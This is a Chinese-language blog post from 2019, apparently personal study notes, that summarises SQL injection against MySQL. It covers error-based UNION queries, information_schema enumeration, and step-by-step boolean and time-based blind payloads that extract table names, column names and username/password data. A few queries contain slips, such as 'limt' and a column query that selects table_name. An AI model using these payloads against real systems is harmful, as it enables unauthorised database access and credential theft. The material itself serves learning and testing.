<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">


























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.0.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">


  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.0.1',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="Emerald Dream">
<meta property="og:url" content="https://chirec.github.io/index.html">
<meta property="og:site_name" content="Emerald Dream">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Emerald Dream">






  <link rel="canonical" href="https://chirec.github.io/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Emerald Dream</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Emerald Dream</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    
  
  
  
  

  

  <a href="https://github.com/ChireC" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/11/Sql-Injection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/11/Sql-Injection/" class="post-title-link" itemprop="url">'SQL注入总结'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-11 20:15:59" itemprop="dateCreated datePublished" datetime="2019-04-11T20:15:59+08:00">2019-04-11</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1. SQL注入原理"></a>1. SQL注入原理</h1><p>前端有一个参数用户可控<br>服务器对该参数没有过滤或过滤不严谨<br><strong>本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</strong><br><img src="Sql-Injection.assets/8942fad0bc755518cbb2a0ae33882700.png" alt></p>
<h1 id="2-SQL注入危害"><a href="#2-SQL注入危害" class="headerlink" title="2. SQL注入危害"></a>2. SQL注入危害</h1><p>读取数据库的数据<br>修改或删除数据<br>getshell<br>往服务器读写文件</p>
<h1 id="3-显错注入"><a href="#3-显错注入" class="headerlink" title="3. 显错注入"></a>3. 显错注入</h1><h2 id="3-1-常用函数"><a href="#3-1-常用函数" class="headerlink" title="3.1 常用函数"></a>3.1 常用函数</h2><h3 id="3-1-1-显示信息"><a href="#3-1-1-显示信息" class="headerlink" title="3.1.1 显示信息"></a>3.1.1 显示信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user() </span><br><span class="line">@@hostname</span><br><span class="line">version() </span><br><span class="line">@@version</span><br><span class="line">database() </span><br><span class="line">@@tmpdir</span><br><span class="line">@@datadir</span><br><span class="line">@@basedir</span><br></pre></td></tr></table></figure>
<h3 id="3-1-2-拼接字段"><a href="#3-1-2-拼接字段" class="headerlink" title="3.1.2 拼接字段"></a>3.1.2 拼接字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">concat() 拼接多个字符串</span><br><span class="line">concat(username,0x7e,password)</span><br><span class="line">group_concat() 拼接表头</span><br><span class="line">group_concat(username,password)</span><br><span class="line">concat_ws() 拼接字符串，第一个字符串为分割符</span><br><span class="line">concat_ws(0x7e,username,password)</span><br></pre></td></tr></table></figure>
<h3 id="3-1-3-截取字段"><a href="#3-1-3-截取字段" class="headerlink" title="3.1.3 截取字段"></a>3.1.3 截取字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid() 适用于MySQL</span><br><span class="line">substr() 适用于Oracle MySQL SQLSERVER</span><br><span class="line">substring() 适用于MySQL SQLSERVER</span><br><span class="line">left()</span><br><span class="line">right()</span><br></pre></td></tr></table></figure>
<h3 id="3-1-4-条件判断"><a href="#3-1-4-条件判断" class="headerlink" title="3.1.4 条件判断"></a>3.1.4 条件判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(判断的条件，条件为真返回值，条件为假返回值)</span><br><span class="line">select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);</span><br><span class="line">select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case when 判断的条件 then 条件为真返回值 else 条件为假返回值 end</span><br><span class="line">select case when 1=1 then &apos;true&apos; else &apos;false&apos; end;</span><br><span class="line">select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end;</span><br></pre></td></tr></table></figure>
<h3 id="3-1-5-判断字段数"><a href="#3-1-5-判断字段数" class="headerlink" title="3.1.5 判断字段数"></a>3.1.5 判断字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br></pre></td></tr></table></figure>
<h2 id="3-2-数据库的注释"><a href="#3-2-数据库的注释" class="headerlink" title="3.2 数据库的注释"></a>3.2 数据库的注释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">%23</span><br><span class="line">--+</span><br><span class="line">--&amp;nbsp</span><br><span class="line">--%20</span><br></pre></td></tr></table></figure>
<h2 id="3-3-union-联合查询"><a href="#3-3-union-联合查询" class="headerlink" title="3.3 union 联合查询"></a>3.3 union 联合查询</h2><p>联合查询的前后字段数要求相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select uname,password,gender from users union select 1,2,3;</span><br></pre></td></tr></table></figure>
<h2 id="3-4-系统数据库"><a href="#3-4-系统数据库" class="headerlink" title="3.4 系统数据库"></a>3.4 系统数据库</h2><h3 id="3-4-1-information-schema"><a href="#3-4-1-information-schema" class="headerlink" title="3.4.1 information_schema"></a>3.4.1 information_schema</h3><p>mysql版本5.0以上，系统自带。<br>汇总所有数据库的库名、表名、字段名。<br><img src="Sql-Injection.assets/1554986623949.png" alt="1554986623949"></p>
<h4 id="3-4-1-1-columns表"><a href="#3-4-1-1-columns表" class="headerlink" title="3.4.1.1 columns表"></a>3.4.1.1 columns表</h4><p><img src="Sql-Injection.assets/1554986667384.png" alt="1554986667384"></p>
<table>
<thead>
<tr>
<th style="text-align:center">字段名</th>
<th style="text-align:center">存放数据</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">table_schema</td>
<td style="text-align:center">存放所有数据库的库名</td>
</tr>
<tr>
<td style="text-align:center">table_name</td>
<td style="text-align:center">存放所有表名</td>
</tr>
<tr>
<td style="text-align:center">column_name</td>
<td style="text-align:center">存放所有字段名</td>
</tr>
<tr>
<td style="text-align:center">privileges</td>
<td style="text-align:center">存放可操作语句</td>
</tr>
</tbody>
</table>
<h4 id="3-4-1-2-tables表"><a href="#3-4-1-2-tables表" class="headerlink" title="3.4.1.2 tables表"></a>3.4.1.2 tables表</h4><p><img src="Sql-Injection.assets/1554987276267.png" alt="1554987276267"></p>
<table>
<thead>
<tr>
<th style="text-align:center">字段名</th>
<th style="text-align:center">存放数据</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">table_schema</td>
<td style="text-align:center">存放所有数据库的库名</td>
</tr>
<tr>
<td style="text-align:center">table_name</td>
<td style="text-align:center">存放所有表名</td>
</tr>
</tbody>
</table>
<h3 id="3-4-2-常用查询"><a href="#3-4-2-常用查询" class="headerlink" title="3.4.2 常用查询"></a>3.4.2 常用查询</h3><h4 id="3-4-2-1-查询所有数据库的库名"><a href="#3-4-2-1-查询所有数据库的库名" class="headerlink" title="3.4.2.1 查询所有数据库的库名"></a>3.4.2.1 查询所有数据库的库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_schema from information_schema.columns;</span><br></pre></td></tr></table></figure>
<h4 id="3-4-2-2-查询数据库中某个数据库中的所有表名"><a href="#3-4-2-2-查询数据库中某个数据库中的所有表名" class="headerlink" title="3.4.2.2 查询数据库中某个数据库中的所有表名"></a>3.4.2.2 查询数据库中某个数据库中的所有表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_name from information_schema.columns where table_schema=&apos;chessur&apos;;</span><br></pre></td></tr></table></figure>
<h4 id="3-4-2-3-查询数据库中某个数据库中某个表的所有字段名"><a href="#3-4-2-3-查询数据库中某个数据库中某个表的所有字段名" class="headerlink" title="3.4.2.3 查询数据库中某个数据库中某个表的所有字段名"></a>3.4.2.3 查询数据库中某个数据库中某个表的所有字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct column_name from information_schema.columns where table_schema=&apos;chessur&apos; and table_name=&apos;users&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="3-5-手工注入流程"><a href="#3-5-手工注入流程" class="headerlink" title="3.5 手工注入流程"></a>3.5 手工注入流程</h2><h3 id="3-5-1-Step-1-判断是否有注入"><a href="#3-5-1-Step-1-判断是否有注入" class="headerlink" title="3.5.1 Step 1 判断是否有注入"></a>3.5.1 Step 1 判断是否有注入</h3><p>判断从后台数据库中选取的列数，判断哪几列在前端显示</p>
<h3 id="3-5-2-Step-2-收集数据库信息（用户名，版本，当前数据库名）"><a href="#3-5-2-Step-2-收集数据库信息（用户名，版本，当前数据库名）" class="headerlink" title="3.5.2 Step 2 收集数据库信息（用户名，版本，当前数据库名）"></a>3.5.2 Step 2 收集数据库信息（用户名，版本，当前数据库名）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br><span class="line">select user();</span><br><span class="line">select database();</span><br></pre></td></tr></table></figure>
<h3 id="3-5-3-Step-3-获取当前数据库下的所有表名"><a href="#3-5-3-Step-3-获取当前数据库下的所有表名" class="headerlink" title="3.5.3 Step 3 获取当前数据库下的所有表名"></a>3.5.3 Step 3 获取当前数据库下的所有表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(distinct table_name) from information_schema.columns where table_schema=database();</span><br></pre></td></tr></table></figure>
<h3 id="3-5-4-Step-4-获取当前数据库下指定表中字段名"><a href="#3-5-4-Step-4-获取当前数据库下指定表中字段名" class="headerlink" title="3.5.4 Step 4 获取当前数据库下指定表中字段名"></a>3.5.4 Step 4 获取当前数据库下指定表中字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(distinct table_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;;</span><br></pre></td></tr></table></figure>
<h3 id="3-5-5-Step-5-获取字段对应的数据"><a href="#3-5-5-Step-5-获取字段对应的数据" class="headerlink" title="3.5.5 Step 5 获取字段对应的数据"></a>3.5.5 Step 5 获取字段对应的数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(distinct password) from users;</span><br></pre></td></tr></table></figure>
<h3 id="3-5-6-Step-6-解密数据"><a href="#3-5-6-Step-6-解密数据" class="headerlink" title="3.5.6 Step 6 解密数据"></a>3.5.6 Step 6 解密数据</h3><p>数据库中有些数据会加密存放，所以需要解密。</p>
<h1 id="4-盲注"><a href="#4-盲注" class="headerlink" title="4. 盲注"></a>4. 盲注</h1><p>因为不能回显错误信息，所以盲注要一个字符一个字符的尝试，通过二分法可以节省很多时间。</p>
<h2 id="4-1-常用函数"><a href="#4-1-常用函数" class="headerlink" title="4.1 常用函数"></a>4.1 常用函数</h2><h3 id="4-1-1-显示字段长度"><a href="#4-1-1-显示字段长度" class="headerlink" title="4.1.1 显示字段长度"></a>4.1.1 显示字段长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br></pre></td></tr></table></figure>
<h3 id="4-1-2-显示ASCII"><a href="#4-1-2-显示ASCII" class="headerlink" title="4.1.2 显示ASCII"></a>4.1.2 显示ASCII</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii()</span><br><span class="line">ord()</span><br></pre></td></tr></table></figure>
<h3 id="4-1-3-截取字段"><a href="#4-1-3-截取字段" class="headerlink" title="4.1.3 截取字段"></a>4.1.3 截取字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid() 适用于MySQL</span><br><span class="line">substr() 适用于Oracle MySQL SQLSERVER</span><br><span class="line">substring() 适用于MySQL SQLSERVER</span><br><span class="line">left()</span><br><span class="line">right()</span><br></pre></td></tr></table></figure>
<h3 id="4-1-4-等待函数"><a href="#4-1-4-等待函数" class="headerlink" title="4.1.4 等待函数"></a>4.1.4 等待函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark()</span><br></pre></td></tr></table></figure>
<h2 id="4-2-布尔盲注"><a href="#4-2-布尔盲注" class="headerlink" title="4.2 布尔盲注"></a>4.2 布尔盲注</h2><h3 id="4-2-1-Step-1-探测注入点"><a href="#4-2-1-Step-1-探测注入点" class="headerlink" title="4.2.1 Step 1 探测注入点"></a>4.2.1 Step 1 探测注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">?id=1&apos; and 1=1 #</span><br><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1 #</span><br></pre></td></tr></table></figure>
<p>根据页面的显示效果判断是否有注入点</p>
<h3 id="4-2-2-Step-2-收集数据信息"><a href="#4-2-2-Step-2-收集数据信息" class="headerlink" title="4.2.2 Step 2 收集数据信息"></a>4.2.2 Step 2 收集数据信息</h3><p>收集当前用户名、当前数据库、当前数据库版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and substr((select version()),1,1)&gt;4 //判断数据库版本是否大于4</span><br></pre></td></tr></table></figure>
<p>5.0以上的mysql数据库有information_schema数据库。</p>
<h3 id="4-2-3-Step-3-查询当前数据库中的表名"><a href="#4-2-3-Step-3-查询当前数据库中的表名" class="headerlink" title="4.2.3 Step 3 查询当前数据库中的表名"></a>4.2.3 Step 3 查询当前数据库中的表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),1,1))=33 //判断第一个字符</span><br><span class="line">and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),2,1))=33 //判断第二个字符</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第一个表名长度</span><br><span class="line">and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第二个表名长度</span><br><span class="line">and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)) //第一个表的第一个字符</span><br><span class="line">and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),2,1)) //第一个表的第二个字符</span><br><span class="line">and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 1,1),1,1)) //第二个表的第一个字符</span><br></pre></td></tr></table></figure>
<h3 id="4-2-4-Step-4-获取指定表的字段名"><a href="#4-2-4-Step-4-获取指定表的字段名" class="headerlink" title="4.2.4 Step 4 获取指定表的字段名"></a>4.2.4 Step 4 获取指定表的字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33 //判断第一个字段的第一个字符</span><br><span class="line">and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33 //判断第一个字段的第二个字符</span><br><span class="line">and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33 //判断第二个字段的第一个字符</span><br></pre></td></tr></table></figure>
<h3 id="4-2-5-Step-5-获取字段数据"><a href="#4-2-5-Step-5-获取字段数据" class="headerlink" title="4.2.5 Step 5 获取字段数据"></a>4.2.5 Step 5 获取字段数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第一个数据的第一个字符</span><br><span class="line">and ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33 //判断第一个数据的第二个字符</span><br><span class="line">and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第二个数据的第一个字符</span><br></pre></td></tr></table></figure>
<h2 id="4-3-延时注入"><a href="#4-3-延时注入" class="headerlink" title="4.3 延时注入"></a>4.3 延时注入</h2><p>无法通过布尔盲注来判断SQL语句是否执行成功时，可以尝试报错延时注入。<br>延时注入也叫基于时间的盲注。<br>判断依据：页面加载时间<br>延时注入使用条件判断语句以及等待函数来判断SQL语句是否执行成功。</p>
<h3 id="4-3-1-延时函数"><a href="#4-3-1-延时函数" class="headerlink" title="4.3.1 延时函数"></a>4.3.1 延时函数</h3><h3 id="4-3-1-1-sleep"><a href="#4-3-1-1-sleep" class="headerlink" title="4.3.1.1 sleep()"></a>4.3.1.1 sleep()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5) //让数据库等待5秒，再返回结果</span><br></pre></td></tr></table></figure>
<h4 id="4-3-1-2-benchemark"><a href="#4-3-1-2-benchemark" class="headerlink" title="4.3.1.2 benchemark()"></a>4.3.1.2 benchemark()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(500000000,md5(&apos;abc&apos;))</span><br></pre></td></tr></table></figure>
<h3 id="4-3-2-条件判断"><a href="#4-3-2-条件判断" class="headerlink" title="4.3.2 条件判断"></a>4.3.2 条件判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(判断的条件，条件为真返回值，条件为假返回值)</span><br><span class="line">select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);</span><br><span class="line">select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case when 判断的条件 then 条件为真返回值 else 条件为假返回值 end</span><br><span class="line">select case when 1=1 then &apos;true&apos; else &apos;false&apos; end;</span><br><span class="line">select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end;</span><br></pre></td></tr></table></figure>
<h3 id="4-3-3-基本构造"><a href="#4-3-3-基本构造" class="headerlink" title="4.3.3 基本构造"></a>4.3.3 基本构造</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(1=1,1,sleep(5)) #</span><br></pre></td></tr></table></figure>
<h3 id="4-3-4-注入流程"><a href="#4-3-4-注入流程" class="headerlink" title="4.3.4 注入流程"></a>4.3.4 注入流程</h3><h4 id="4-3-4-1-Step-1-探测注入点"><a href="#4-3-4-1-Step-1-探测注入点" class="headerlink" title="4.3.4.1 Step 1 探测注入点"></a>4.3.4.1 Step 1 探测注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">?id=1&apos; and 1=1 #</span><br><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1 #</span><br></pre></td></tr></table></figure>
<h4 id="4-3-4-2-Step-2-收集数据信息"><a href="#4-3-4-2-Step-2-收集数据信息" class="headerlink" title="4.3.4.2 Step 2 收集数据信息"></a>4.3.4.2 Step 2 收集数据信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(substr(version(),1,1)&gt;4,1,sleep(5)) #</span><br><span class="line">?id=1 and if(ord(substr(database(),1,1))=33,1,sleep(5)) #</span><br><span class="line">?id=1 and if(ord(substr(database(),2,1))=33,1,sleep(5)) #</span><br></pre></td></tr></table></figure>
<h4 id="4-3-4-3-Step-3-查询当前数据库中的表名"><a href="#4-3-4-3-Step-3-查询当前数据库中的表名" class="headerlink" title="4.3.4.3 Step 3 查询当前数据库中的表名"></a>4.3.4.3 Step 3 查询当前数据库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=33,1,sleep(5))</span><br><span class="line">?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),2,1))=33,1,sleep(5))</span><br><span class="line">?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 1,1),1,1))=33,1,sleep(5))</span><br></pre></td></tr></table></figure>
<h4 id="4-3-4-4-Step-4-查询指定表的字段名"><a href="#4-3-4-4-Step-4-查询指定表的字段名" class="headerlink" title="4.3.4.4 Step 4 查询指定表的字段名"></a>4.3.4.4 Step 4 查询指定表的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33,1,sleep(5))</span><br><span class="line">?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33,1,sleep(5))</span><br><span class="line">?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33,1,sleep(5))</span><br></pre></td></tr></table></figure>
<h4 id="4-3-4-5-Step-5-获取字段数据"><a href="#4-3-4-5-Step-5-获取字段数据" class="headerlink" title="4.3.4.5 Step 5 获取字段数据"></a>4.3.4.5 Step 5 获取字段数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33,1,sleep(5))</span><br><span class="line">and if(ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33,1,sleep(5))</span><br><span class="line">and if(ascii(substr((select concat(username,password)from users limit 1,1),1,1))=33,1,sleep(5))</span><br></pre></td></tr></table></figure>
